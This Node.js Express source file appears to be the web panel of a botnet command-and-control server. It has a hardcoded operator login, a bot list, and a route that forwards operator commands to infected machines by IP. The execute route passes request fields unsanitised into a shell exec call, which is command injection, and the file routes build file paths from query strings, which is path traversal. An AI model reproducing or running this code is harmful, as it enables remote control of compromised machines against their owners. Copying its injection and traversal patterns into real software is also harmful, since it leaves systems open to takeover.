var express = require('express');
var bodyParser = require('body-parser');
var exec = require('child_process');
var fs = require('fs');

var app = express();
var urlEncodedParser = bodyParser.urlencoded({extended:false});

app.set('view engine','ejs');

app.get('/control/delete',function(req,resp){
    fs.writeFileSync(__dirname + `/data/${req.query.ip}.txt`,'');
})

app.get('/control/update',function(req,resp){
    resp.sendFile(__dirname + `/data/${req.query.id}.txt`)
})

exec.exec('python refresh.py',(error,stdout,stderr) => {
    botnet = stdout.split(',');
});

app.use('/',express.static('./public'));

app.post('/control/execute',urlEncodedParser,function(req,resp){
    cmd = req.body.cmd;
    ip = req.body.ip;
    console.log(cmd,ip);
    exec.exec(`python issue_cmd.py ${cmd} ${ip}`);
    console.log('Command issued');
    resp.render('control',{'name':ip})
})

app.post('/refresh',function(req,resp){
    exec.exec('python refresh.py',(error,stdout,stderr) => {
        botnet = stdout.split(',');
        botnet[botnet.length - 1] = botnet[botnet.length-1].trim()
        // console.log(botnet);
        // console.log('Responding...');
        resp.render('CnC',{'bots':botnet});
    });
    // reload(resp);
});

app.get('/',function(req,resp){
    resp.render('login');
});

app.get('/control',function(req,resp){
    if(botnet.includes(req.query.id)){
    resp.render('control',{'name':req.query.id});
    }
    else{
        resp.status(404);
        resp.render('error');
    }
});

app.post('/login',urlEncodedParser,function(req,resp){
    if (req.body.username === 'baapo'){
        // console.log('Username Ok');
        if (req.body.pass === 'deveshisgreat'){
            // console.log('Password Ok')
            resp.render('CnC',{'bots':botnet});
        }
        else{
            resp.render('login')
        }
    }
    else{
        resp.render('login')
    }

})

app.listen(80)